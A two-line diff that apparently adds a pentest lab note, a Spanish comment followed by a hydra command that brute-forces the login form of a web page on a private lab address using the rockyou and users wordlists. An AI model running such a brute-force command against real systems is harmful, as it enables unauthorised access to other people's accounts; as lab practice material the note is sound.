@@ -1,0 +1,2 @@
+# Fuerza bruta a formulario POST
+hydra 192.168.56.101 http-form-post "/?page=login:user=^USER^&pass=^PASS^&submit=Login:failed" -P /usr/share/wordlists/rockyou.txt -L /usr/share/wordlists/users.txt -v -V -w 30 -t 10
